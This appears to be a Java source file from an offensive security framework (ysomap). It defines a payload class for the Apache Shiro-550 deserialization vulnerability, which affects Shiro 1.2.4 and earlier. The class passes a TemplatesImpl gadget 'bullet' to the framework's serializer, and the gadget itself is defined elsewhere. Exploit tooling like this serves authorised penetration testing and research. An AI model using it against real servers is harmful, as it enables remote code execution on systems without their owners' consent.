package ysomap.payloads.java.shiro;

import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.bullets.shiro.TemplatesImplShiroBullet;
import ysomap.common.annotation.*;
import ysomap.payloads.AbstractPayload;

@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.M01E })
@Targets({Targets.SHIRO})
@Require(bullets = {"TemplatesImplShiroBullet"},param = false)
@Dependencies({"shiro <= 1.2.4"})
public class Shiro550Payload extends AbstractPayload {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return TemplatesImplShiroBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        return obj;
    }

    public Shiro550Payload() {
        this.serializeType = "shiro";
        this.serializerOutputType = "console";
    }
}
